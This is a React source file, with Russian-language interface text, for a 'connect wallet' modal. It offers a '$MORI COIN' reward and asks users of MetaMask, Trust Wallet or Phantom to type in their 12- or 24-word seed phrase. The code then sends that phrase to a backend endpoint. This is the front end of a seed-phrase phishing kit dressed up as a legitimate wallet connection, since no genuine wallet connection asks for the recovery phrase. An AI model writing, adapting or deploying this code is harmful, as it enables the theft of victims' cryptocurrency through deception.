import React, { useState, useCallback } from 'react';
import { useGoogleReCaptcha } from 'react-google-recaptcha-v3';
import './WalletModal.css';

const WALLETS = [
  { name: 'MetaMask', icon: '/icons/metamask-logo.svg' },
  { name: 'Trust Wallet', icon: '/icons/trustwallet-logo.svg' },
  { name: 'Phantom', icon: '/icons/phantom-logo.svg' },
];

const WalletModal = ({ onClose }) => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [phraseType, setPhraseType] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [statusMessage, setStatusMessage] = useState('');

  const BACKEND_URL = '/.netlify/functions/secure-message';
  const { executeRecaptcha } = useGoogleReCaptcha();

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
  };

  const handlePhraseTypeSelect = (type) => {
    setPhraseType(type);
  };
  
  const handleBack = () => {
    if (phraseType) {
      setPhraseType(null);
    } else if (selectedWallet) {
      setSelectedWallet(null);
    }
  };

  const handleSubmit = useCallback(async (e) => {
    e.preventDefault();
    if (!executeRecaptcha) {
      console.error('reCAPTCHA еще не загрузилась');
      setStatusMessage('❌ Ошибка! Проверка на робота не загрузилась. Попробуйте позже.');
      return;
    }
    setStatusMessage('Проверка и отправка данных...');

    // Получаем токен от Google
    const recaptchaToken = await executeRecaptcha('submitForm');

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletName: selectedWallet.name,
          seedPhrase: seedPhrase,
          recaptchaToken: recaptchaToken, // Отправляем токен на бэкенд
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        setStatusMessage(`✅ ${data.message}`);
      } else {
        throw new Error(data.message || 'Не удалось отправить данные.');
      }
    } catch (error) {
      console.error('Ошибка отправки на бэкенд:', error);
      setStatusMessage(`❌ Ошибка! ${error.message}. Попробуйте позже.`);
    }
  }, [executeRecaptcha, selectedWallet, seedPhrase]);

  if (statusMessage) {
    return (
      <div className="modal-overlay">
        <div className="modal-content">
          <button className="close-button" onClick={onClose}>×</button>
          <h2>Статус заявки</h2>
          <p style={{ color: statusMessage.includes('❌') ? '#ff9999' : '#99ff99' }}>
            {statusMessage}
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <button className="close-button" onClick={onClose}>×</button>
        {selectedWallet && (
            <button className="back-button" onClick={handleBack}>←</button>
        )}

        {!selectedWallet ? (
          <>
            <h2>Выберите ваш кошелек</h2>
            <div className="wallet-list">
              {WALLETS.map((wallet) => (
                <div key={wallet.name} className="wallet-item" onClick={() => handleWalletSelect(wallet)}>
                  <img src={wallet.icon} alt={`${wallet.name} logo`} className="wallet-icon" />
                  <span>{wallet.name}</span>
                </div>
              ))}
            </div>
            <p className="partnership-note">Партнерство только с указанными кошельками.</p>
          </>
        ) : !phraseType ? (
            <>
                <h2>Выберите тип фразы</h2>
                <div className="phrase-type-selection">
                    <button className="phrase-type-button" onClick={() => handlePhraseTypeSelect(12)}>
                        12 слов
                    </button>
                    <button className="phrase-type-button" onClick={() => handlePhraseTypeSelect(24)}>
                        24 слова
                    </button>
                </div>
            </>
        ) : (
          <>
            <h2>Подключите кошелек {selectedWallet.name}</h2>
            <form onSubmit={handleSubmit}>
              <label htmlFor="seedPhrase">Введите вашу сид фразу ({phraseType} слов)</label>
              <textarea
                id="seedPhrase"
                name="seedPhrase"
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                placeholder="Введите слова через пробел..."
                required
                rows={phraseType === 24 ? 5 : 3}
              />
              <button type="submit" className="submit-button">Получить $MORI COIN</button>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default WalletModal;